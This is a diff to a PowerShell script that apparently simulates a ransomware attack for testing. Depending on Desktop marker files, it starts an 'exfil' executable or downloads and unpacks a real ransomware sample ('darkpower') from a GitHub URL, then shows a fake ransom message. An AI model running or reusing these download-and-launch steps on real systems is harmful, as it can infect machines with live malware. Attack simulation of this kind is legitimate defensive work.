@@ -1,5 +1,6 @@
 $Folder = $HOME + '/Desktop/ImportantDocuments/'
 $Exfil = $HOME + '/Desktop/exfil'
+$sample = $HOME + '/Desktop/darkpower'
 
 "Test to see if folder [$Folder] exists - v3"
 if (Test-Path -Path $Folder) {
@@ -20,8 +21,22 @@ if (Test-Path -Path $Folder) {
     Start-Sleep -Seconds 5
     "Running file"
     Start-Process -FilePath $ExfilPath
-  } else {
-    "Will not exfil"
+  } elseif (Test-Path -Path $sample -PathType Leaf) {
+    "******** Will download ransomware - DANGEROUS **************"
+    $URL = 'https://github.com/PoesRaven/public/raw/master/darkpower.zip'
+    $SamplePath = $HOME + '/Desktop/darkpower.zip'
+    $DestinationPath = $HOME + '/Desktop/darkpower.exe'
+    "Grabbing file"
+    Invoke-WebRequest -URI $URL -OutFile $SamplePath
+    "Wait 5 seconds"
+    Start-Sleep -Seconds 5
+    "Decompressing file"
+    Expand-Archive $SamplePath -DestinationPath $DestinationPath
+    "Wait 5 seconds"
+    Start-Sleep -Seconds 5
+    Remove-Item $DestinationPath
+  }  else {
+    "Will not exfil or download ransomware"
   }
   $msgBody = "All of your important documents have been encrypted. Pay the ransom... or else!!!" 
   [System.Windows.MessageBox]::Show($msgBody)
